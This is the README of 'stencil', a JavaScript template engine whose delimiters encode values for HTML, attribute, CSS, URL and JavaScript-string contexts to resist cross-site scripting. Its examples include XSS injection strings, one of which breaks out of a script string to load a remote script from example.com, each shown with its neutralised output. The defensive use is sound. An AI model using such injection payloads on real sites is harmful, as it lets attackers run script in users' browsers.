# stencil

A lightweight template engine with comprehensive encoding methods for mitigating
the risk of cross-site scripting (XSS) attacks.

## Installation

```
npm install https://github.com/mikol/stencil
```

## Usage

```javascript
var template = '<script>alert("Hello, !{name}!")</script>';
var locals = {
  name: '");' +
    'var $dq=document;' +
    'var $xp=$dq.createElement("script");' +
    '$xp.setAttribute("src", "https://example.com/xss.js");' +
    '$dq.getElementsByTagName("head")[0].appendChild($xp);'
};

stencil(template, locals);
```

```html
<script>alert("Hello, \x22\x29\x3bvar\x20\x24dq\x3ddocument\x3bvar\x20\x24xp\x3d\x24dq\x2ecreateElement\x28\x22script\x22\x29\x3b\x24xp\x2esetAttribute\x28\x22src\x22\x2c\x20\x22https\x3a\x2f\x2fexample\x2ecom\x2fxss\x2ejs\x22\x29\x3b\x24dq\x2egetElementsByTagName\x28\x22 head\x22\x29\x5b0\x5d\x2eappendChild\x28\x24xp\x29\x3b!");</script>
```

## Encoding Delimiters

### Echo

Use `${...}` to output a raw, unencoded value.

```javascript
stencil('Hello, ${name}!', {name: 'Ŵøяłð"&\'/<>`'});
```

Result:

```html
Hello, Ŵøяłð"&'/<>`!
```

### Base64

Use `+{...}` to base64 encode a value; then output it.

```javascript
stencil('Hello, +{name}!', {name: 'Ŵ🜘я🜯🜱'});
```

Result:

```html
Hello, xbTwn5yY0Y/wn5yv8J+csQ==!
```

### Base64ni

Use `-{...}` to base64 encode a value with a URL- and filename-safe alphabet and
without `'='` padding characters; then output it.

```javascript
stencil('Hello, -{name}!', {name: 'Ŵ🜘я🜯🜱'});
```

Result:

```html
Hello, xbTwn5yY0Y_wn5yv8J-csQ!
```

### CSS Properties

Use `:{...}` to make a value safe for inclusion in a CSS property; then
output it.

```javascript
stencil('<style>background-url: :{property};</style>', {
  property: 'javascript:alert(1)'
});
```

Result:

```html
<style>background-url: javascript\00003aalert\0000281\000029;</style>
```

### HTML Attributes

Use `={...}` to make a value safe for inclusion in an HTML attribute; then
output it.

```javascript
stencil('<span class="={cname}">Hello, World!</span>', {
  cname: '"\'%*+,-/<;>^| = risqué busịness'
});
```

Result:

```html
<span class="&#34;&#39;&#37;&#42;&#43;&#44;&#45;&#47;&lt;&#59;&gt;&#94;&#124;&#32;&#61;&#32;risqu&#233;&#32;busịness">Hello, World!</span>
```

### HTML Elements

Use `>{...}` to make a value safe for inclusion within an HTML element; then
output it.

```javascript
stencil('<span>Hello, >{name}!</span>', {
  name: '<script>alert(1);</script>'
});
```

Result:

```html
<span>Hello, &lt;script&gt;alert(1);&lt;&#47;script&gt;!</span>
```

### JavaScript Strings

Use `!{...}` make a value safe for inclusion within a quoted JavaScript string;
then output it.

```javascript
stencil('<script>alert("Hello, !{name}!")</script>', {
  name: '");alert(1);"'
});
```

Result:

```html
<script>alert("Hello, \x22\x29\x3balert\x281\x29\x3b\x22!")</script>
```

### URI Components

Use `%{...}` to make a value safe for inclusion in a URL context; then output
it. Every non-alphanumeric character `/[^0-9A-Za-z]/` in the ASCII range [0–255) will be URL-encoded (which is more extensive than `encodeURIComponent()`).

```javascript
stencil('<a href="/help/kbid=%{kbid}">...</a>', {
  kbid: '" onclick="alert(1)'
});
```

Result:

```html
<a href="/help/kbid=%22%20onclick%3d%22alert%281%29">...</a>
```

### Embedded JavaScript

Arbitrary JavaScript enclosed in back ticks will be evaluated when the template
is rendered and can be interleaved with plain template text to take advantage of
conditions, loops, and other JavaScript features.

```html
`if (typeof window === 'object') {`
  <pre style="color:#090">This will render if the expression is true.</pre>
`} else {`
  <pre style="color:#c00">Otherwise this will.</pre>
`}`
```
